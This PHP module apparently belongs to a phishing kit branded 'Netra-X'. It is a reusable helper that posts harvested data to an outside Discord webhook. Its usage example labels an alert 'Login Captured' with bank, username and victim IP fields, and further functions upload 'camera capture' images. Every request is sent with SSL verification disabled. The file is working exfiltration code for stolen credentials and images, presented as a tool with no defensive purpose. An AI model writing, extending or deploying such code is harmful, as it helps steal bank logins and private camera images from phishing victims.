<?php
/* ════════════════════════════════════════════════════════════════════
   core/discord_webhook.php  --  Discord Webhook Notifier
   ---------------------------------------------------------------
   A modular, reusable helper for sending notifications to Discord
   via the Netra-X bot webhook (posts to #general channel).

   Usage from any handler:
       require_once __DIR__ . '/../core/discord_webhook.php';

       // Plain-text message (uses default confirmation text):
       sendDiscordNotification();

       // Plain-text with custom content:
       sendDiscordNotification('User logged in successfully.');

       // Rich embed with key-value fields:
       sendDiscordAlert('Login Captured', [
           'Bank'     => $bank,
           'Username' => $username,
           'IP'       => $client_ip,
       ]);
   ════════════════════════════════════════════════════════════════════ */

/* ── Webhook Configuration ─────────────────────────────────────── */
/* Load configuration from .env file for better security */
$env_file = dirname(__DIR__) . '/.env';
$webhook_url = '';

if (file_exists($env_file)) {
    $env_content = file_get_contents($env_file);
    if (preg_match('/^DISCORD_WEBHOOK_URL="(.*)"$/m', $env_content, $matches)) {
        $webhook_url = $matches[1];
    } elseif (preg_match('/^DISCORD_WEBHOOK_URL=(.*)$/m', $env_content, $matches)) {
        $webhook_url = trim($matches[1], "\"'"); // Remove quotes if present
    }
}

define('DISCORD_WEBHOOK_URL', $webhook_url);
define('DISCORD_BOT_USERNAME',    'Netra-X bot');
define('DISCORD_DEFAULT_MESSAGE', 'Data has been successfully received from the website.');

/* ── Error log path  (mirrors /data structure used by other handlers) ── */
define('DISCORD_LOG_FILE', dirname(__DIR__) . '/data/discord_errors.log');


/* ════════════════════════════════════════════════════════════════════
   PUBLIC API
   ════════════════════════════════════════════════════════════════════ */

/**
 * sendDiscordNotification()
 * --------------------------
 * Sends a plain-text POST to the #general Discord channel via the
 * Netra-X bot webhook.
 *
 * @param  string $message  Text to post. Defaults to the standard
 *                          confirmation message.
 * @param  string $username Display name override (optional).
 * @return bool             TRUE on HTTP 200-204, FALSE on error.
 */
function sendDiscordNotification(
    string $message  = DISCORD_DEFAULT_MESSAGE,
    string $username = DISCORD_BOT_USERNAME
): bool {

    $payload = json_encode([
        'content'  => $message,
        'username' => $username,
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    return _discordCurlPost(DISCORD_WEBHOOK_URL, $payload);
}


/**
 * sendDiscordAlert()
 * -------------------
 * Sends a rich Discord embed with structured key-value fields.
 * Ideal for capture/event notifications with metadata.
 *
 * @param  string $title   Embed title shown in bold (e.g. "Login Captured").
 * @param  array  $fields  Associative [ label => value ] pairs.
 * @param  int    $color   Decimal embed sidebar colour (default: gold 0xFFD700).
 * @return bool            TRUE on success, FALSE on failure.
 */
function sendDiscordAlert(
    string $title,
    array  $fields = [],
    int    $color  = 16766720   /* 0xFFD700  gold */
): bool {

    /* Build the Discord "fields" array */
    $embed_fields = [];
    foreach ($fields as $name => $value) {
        $embed_fields[] = [
            'name'   => (string) $name,
            'value'  => '`' . $value . '`',
            'inline' => false,
        ];
    }

    $payload = json_encode([
        'username' => DISCORD_BOT_USERNAME,
        'embeds'   => [[
            'title'     => $title,
            'color'     => $color,
            'fields'    => $embed_fields,
            'footer'    => ['text' => 'Netra-X  •  ' . date('Y-m-d H:i:s T')],
            'timestamp' => date('c'),
        ]],
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    return _discordCurlPost(DISCORD_WEBHOOK_URL, $payload);
}


/**
 * sendDiscordImage()
 * -------------------
 * Uploads an image file to the Discord #general channel via the
 * Netra-X bot webhook using multipart/form-data.
 *
 * @param  string $filepath   Absolute path to the image file on disk.
 * @param  string $caption    Text message to send alongside the image.
 * @param  string $username   Display name override (optional).
 * @return bool               TRUE on HTTP 2xx, FALSE on failure.
 */
function sendDiscordImage(
    string $filepath,
    string $caption  = '📸 Camera capture received.',
    string $username = DISCORD_BOT_USERNAME
): bool {

    if (!is_file($filepath) || !is_readable($filepath)) {
        _discordLogError(0, 'File not found or not readable: ' . $filepath, '', '');
        return false;
    }

    /*
     * Discord webhook file upload requires multipart/form-data.
     * We send two parts:
     *   - payload_json  → JSON with content + username
     *   - file          → the actual image binary
     */
    if (function_exists('curl_init')) {
        return _discordUploadCurl($filepath, $caption, $username);
    }

    return _discordUploadStream($filepath, $caption, $username);
}


/**
 * _discordUploadCurl()  [cURL backend for file upload]
 */
function _discordUploadCurl(string $filepath, string $caption, string $username): bool
{
    $filename = basename($filepath);
    $mimeType = 'image/png';

    $payload_json = json_encode([
        'content'  => $caption,
        'username' => $username,
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => DISCORD_WEBHOOK_URL,
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_HTTPHEADER     => [
            'User-Agent: NetraX-Bot/3.0',
        ],
        CURLOPT_POSTFIELDS     => [
            'payload_json' => $payload_json,
            'file'         => new \CURLFile($filepath, $mimeType, $filename),
        ],
    ]);

    $response  = curl_exec($ch);
    $http_code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_err  = curl_error($ch);
    curl_close($ch);

    $success = ($http_code >= 200 && $http_code <= 299);
    if (!$success) {
        _discordLogError($http_code, $curl_err, $response, 'file upload: ' . $filename);
    }
    return $success;
}


/**
 * _discordUploadStream()  [file_get_contents fallback for file upload]
 */
function _discordUploadStream(string $filepath, string $caption, string $username): bool
{
    $filename   = basename($filepath);
    $fileData   = file_get_contents($filepath);
    $boundary   = '----NetraXBoundary' . bin2hex(random_bytes(8));

    $payload_json = json_encode([
        'content'  => $caption,
        'username' => $username,
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    /* Build multipart body manually */
    $body  = '';

    /* Part 1: payload_json */
    $body .= '--' . $boundary . "\r\n";
    $body .= "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    $body .= "Content-Type: application/json\r\n\r\n";
    $body .= $payload_json . "\r\n";

    /* Part 2: the image file */
    $body .= '--' . $boundary . "\r\n";
    $body .= 'Content-Disposition: form-data; name="file"; filename="' . $filename . '"' . "\r\n";
    $body .= "Content-Type: image/png\r\n\r\n";
    $body .= $fileData . "\r\n";

    /* Closing boundary */
    $body .= '--' . $boundary . "--\r\n";

    $opts = [
        'http' => [
            'method'          => 'POST',
            'header'          => "Content-Type: multipart/form-data; boundary=" . $boundary . "\r\n"
                               . "User-Agent: NetraX-Bot/3.0\r\n"
                               . "Content-Length: " . strlen($body) . "\r\n",
            'content'         => $body,
            'timeout'         => 30,
            'follow_location' => 1,
            'max_redirects'   => 5,
            'ignore_errors'   => true,
        ],
        'ssl' => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
        ],
    ];

    $context  = stream_context_create($opts);
    $response = @file_get_contents(DISCORD_WEBHOOK_URL, false, $context);

    $http_code = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $hdr) {
            if (preg_match('/^HTTP\/[\d.]+ (\d{3})/', $hdr, $m)) {
                $http_code = (int) $m[1];
            }
        }
    }

    $success = ($http_code >= 200 && $http_code <= 299);
    if (!$success) {
        $err_msg = ($response === false) ? 'file_get_contents returned false' : '';
        _discordLogError($http_code, $err_msg, $response ?: '', 'file upload: ' . $filename);
    }
    return $success;
}


/* ════════════════════════════════════════════════════════════════════
   INTERNAL HELPERS  (not intended for direct use)
   ════════════════════════════════════════════════════════════════════ */

/**
 * _discordCurlPost()
 * -------------------
 * Sends a POST request with Content-Type: application/json to the
 * Discord webhook endpoint.
 *
 * Uses cURL when available, otherwise falls back to PHP's built-in
 * file_get_contents() + stream context (no extensions required).
 *
 * @param  string $url     Full Discord webhook URL.
 * @param  string $payload JSON-encoded message body.
 * @return bool            TRUE on HTTP 2xx, FALSE otherwise.
 */
function _discordCurlPost(string $url, string $payload): bool
{
    /*
     * Prefer cURL when the extension is loaded; fall back to
     * file_get_contents() which is always available.
     */
    if (function_exists('curl_init')) {
        return _discordCurlPostCurl($url, $payload);
    }

    return _discordCurlPostStream($url, $payload);
}


/**
 * _discordCurlPostCurl()  [cURL backend]
 */
function _discordCurlPostCurl(string $url, string $payload): bool
{
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_HTTPHEADER     => [
            'Content-Type: application/json',
            'Content-Length: ' . strlen($payload),
            'User-Agent: NetraX-Bot/3.0',
        ],
    ]);

    $response  = curl_exec($ch);
    $http_code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_err  = curl_error($ch);
    curl_close($ch);

    $success = ($http_code >= 200 && $http_code <= 299);
    if (!$success) {
        _discordLogError($http_code, $curl_err, $response, $payload);
    }
    return $success;
}


/**
 * _discordCurlPostStream()  [file_get_contents fallback]
 * -------------------------------------------------------
 * Uses PHP's built-in HTTP stream wrapper -- works on every
 * PHP installation without any extensions.
 */
function _discordCurlPostStream(string $url, string $payload): bool
{
    $opts = [
        'http' => [
            'method'           => 'POST',
            'header'           => "Content-Type: application/json\r\n"
                                . "Content-Length: " . strlen($payload) . "\r\n"
                                . "User-Agent: NetraX-Bot/3.0\r\n",
            'content'          => $payload,
            'timeout'          => 15,
            'follow_location'  => 1,
            'max_redirects'    => 5,
            'ignore_errors'    => true,   /* capture body even on 4xx/5xx */
        ],
        'ssl' => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
        ],
    ];

    $context  = stream_context_create($opts);
    $response = @file_get_contents($url, false, $context);

    /* Extract HTTP status code from $http_response_header (auto-set by PHP) */
    $http_code = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $hdr) {
            if (preg_match('/^HTTP\/[\d.]+ (\d{3})/', $hdr, $m)) {
                $http_code = (int) $m[1];  /* keep last (after redirects) */
            }
        }
    }

    $success = ($http_code >= 200 && $http_code <= 299);

    if (!$success) {
        $err_msg = ($response === false) ? 'file_get_contents returned false' : '';
        _discordLogError($http_code, $err_msg, $response ?: '', $payload);
    }

    return $success;
}


/**
 * _discordLogError()
 * -------------------
 * Thread-safe append to discord_errors.log for every failed delivery.
 * Mirrors the locking pattern used in login_handler.php and others.
 *
 * @param int    $http_code  HTTP status (0 if cURL itself failed).
 * @param string $curl_err   cURL error string (empty string if none).
 * @param mixed  $response   Raw response body from Discord.
 * @param string $payload    The JSON payload that was attempted.
 */
function _discordLogError(
    int    $http_code,
    string $curl_err,
    mixed  $response,
    string $payload
): void {

    /* Ensure /data directory exists */
    $log_dir = dirname(DISCORD_LOG_FILE);
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0750, true);
    }

    $divider = str_repeat('─', 50);
    $entry   = implode("\n", [
        $divider,
        '[Discord Webhook ERROR]  ' . date('Y-m-d H:i:s T'),
        'HTTP Code  : ' . ($http_code ?: 'N/A  (cURL connection failure)'),
        'cURL Error : ' . ($curl_err  ?: 'none'),
        'Response   : ' . (is_string($response) ? substr($response, 0, 500) : 'empty'),
        'Payload    : ' . substr($payload, 0, 500),
        $divider,
    ]) . "\n\n";

    /* ── Thread-safe file append (same lock pattern as login_handler) ── */
    $fp = fopen(DISCORD_LOG_FILE, 'a');
    if ($fp) {
        flock($fp, LOCK_EX);
        fwrite($fp, $entry);
        flock($fp, LOCK_UN);
        fclose($fp);
    }

    /* Mirror to PHP error_log for real-time terminal visibility */
    error_log(
        '[NetraX-3.0] Discord webhook failed'
        . ' (HTTP ' . $http_code . ')'
        . ($curl_err ? ': ' . $curl_err : '')
    );
}
